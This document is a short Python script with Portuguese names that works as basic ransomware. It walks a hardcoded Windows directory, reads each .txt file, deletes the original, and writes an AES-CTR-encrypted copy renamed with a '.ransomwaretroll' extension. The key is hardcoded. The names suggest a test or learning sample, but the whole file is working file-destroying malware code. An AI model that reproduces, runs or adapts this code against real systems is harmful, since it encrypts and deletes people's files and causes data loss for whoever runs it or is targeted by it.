import os
import pyaes

def ler_e_criptografar_arquivos(diretorio, chave):
    
    for arquivo in os.listdir(diretorio):
        if arquivo.endswith(".txt"): 
            caminho_arquivo = os.path.join(diretorio, arquivo)
            
            with open(caminho_arquivo, "rb") as file:
                file_data = file.read()

            os.remove(caminho_arquivo)
            
            aes = pyaes.AESModeOfOperationCTR(chave)
            
            crypto_data = aes.encrypt(file_data)
            
            novo_nome = caminho_arquivo + ".ransomwaretroll"
            with open(novo_nome, "wb") as new_file:
                new_file.write(crypto_data)

diretorio = r"C:\LocalImportante" 

chave = b"testeransomwares"

ler_e_criptografar_arquivos(diretorio, chave)
